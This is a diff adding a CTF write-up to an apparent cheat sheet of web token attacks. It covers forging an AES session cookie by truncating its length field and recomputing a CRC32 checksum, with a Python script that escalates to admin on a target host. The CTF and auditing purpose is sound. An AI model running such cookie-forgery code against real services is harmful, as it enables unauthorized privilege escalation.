@@ -10,6 +10,7 @@
 - [KID Path Traversal (Crypto-Cat)](#kid-path-traversal-crypto-cat)
 - [JWT Balance Replay (MetaShop Pattern)](#jwt-balance-replay-metashop-pattern)
 - [JWE Token Forgery with Exposed Public Key (UTCTF 2026)](#jwe-token-forgery-with-exposed-public-key-utctf-2026)
+- [AES Cookie Length-Field Truncation + CRC32 Swap (DefCamp 2018)](#aes-cookie-length-field-truncation--crc32-swap-defcamp-2018)
 
 For general auth bypass, access control, and session attacks, see [auth-and-access.md](auth-and-access.md). For OAuth/OIDC, SAML, CI/CD credential theft, and infrastructure auth attacks, see [auth-infra.md](auth-infra.md).
 
@@ -151,3 +152,35 @@ forged_jwe = token.serialize(compact=True)
 **Detection:** Token has 5 base64url segments separated by dots (JWE compact format: header.enckey.iv.ciphertext.tag) vs. JWT's 3 segments. Endpoints that expose RSA public keys.
 
 **Key insight:** JWE encryption ≠ authentication. If the server trusts any token it can decrypt without additional signature verification, exposing the public key lets you forge arbitrary claims. Look for public key endpoints and try encrypting modified payloads.
+
+---
+
+## AES Cookie Length-Field Truncation + CRC32 Swap (DefCamp 2018)
+
+**Pattern:** A session cookie has the shape `AES(key¡value÷...¡)+<len>+<CRC32>`. The application parses the decrypted blob up to `<len>` bytes and trusts a CRC32 checksum for integrity. During registration the attacker controls the plaintext: embed `id¡1¡` early in the username, shorten `<len>` to truncate at that point, and recompute the CRC32 over the shortened payload. The deserializer now sees `id=1` (admin) and the CRC32 check still passes because CRC32 is not a MAC.
+
+```python
+import struct, zlib, requests, base64
+
+# 1. Register with a username that embeds the target field early.
+#    The challenge stores fields as key\xa1value\xf7, AES-encrypts them,
+#    then appends a 2-byte length and a 4-byte CRC32.
+payload_fields = b"name\xa1attacker\xf7id\xa11\xf7role\xa1user\xf7"
+# 2. Grab the encrypted cookie the server set.
+sess = requests.Session()
+sess.post("http://target/register",
+          data={"user": "attacker", "pass": "x", "payload": payload_fields})
+cookie = base64.b64decode(sess.cookies["session"])
+ct, rest = cookie[:-6], cookie[-6:]          # split off length + CRC32
+# 3. Truncate: keep only bytes up to and including "id\xa11\xf7"
+truncated_plain = b"name\xa1attacker\xf7id\xa11\xf7"
+new_len = struct.pack("<H", len(truncated_plain))
+new_crc = struct.pack("<I", zlib.crc32(ct[: len(truncated_plain)]))
+forged = base64.b64encode(ct[: len(truncated_plain)] + new_len + new_crc)
+sess.cookies["session"] = forged.decode()
+print(sess.get("http://target/admin").text)
+```
+
+**Key insight:** CRC32 is a checksum, not a message authentication code — it is linear, so flipping any bit in the ciphertext and recomputing the CRC yields a still-"valid" cookie. Combined with a length field that tells the parser how many bytes to decode, the attacker can truncate (or extend) the plaintext at any point. Audit cookies that decrypt to a length-prefixed payload and watch for the signature algorithm: if it is `crc32`, `adler32`, `md5`, or anything that is not an HMAC/AEAD, assume forgery.
+
+**References:** DefCamp CTF Qualification 2018 — Get Admin, writeup 11430
